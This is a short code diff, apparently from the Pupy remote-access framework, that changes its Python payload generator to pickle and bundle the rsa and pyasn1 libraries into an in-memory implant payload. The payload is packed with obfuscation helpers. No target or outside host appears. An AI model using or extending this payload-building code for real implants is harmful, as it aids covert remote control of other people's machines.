@@ -5,7 +5,7 @@
 
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 import cPickle, re, os.path
-import rpyc
+import rpyc, rsa, pyasn1
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.utils.term import colorize
 from pupylib.utils.network import get_local_ip
@@ -25,6 +25,12 @@ def pack_py_payload(conf):
     fullpayload.append("import pupyimporter\npupyimporter.install()\npupyimporter.pupy_add_package(%s)\nimport rpyc"%repr(cPickle.dumps(modules_dic)))
 
     modules_dic=gen_package_pickled_dic(os.path.join(ROOT,"network"),"network")
+    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
+
+    modules_dic=gen_package_pickled_dic(pyasn1.__path__[0],"pyasn1")
+    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
+
+    modules_dic=gen_package_pickled_dic(rsa.__path__[0],"rsa")
     fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
 
     with open(os.path.join(ROOT,"pp.py")) as f:
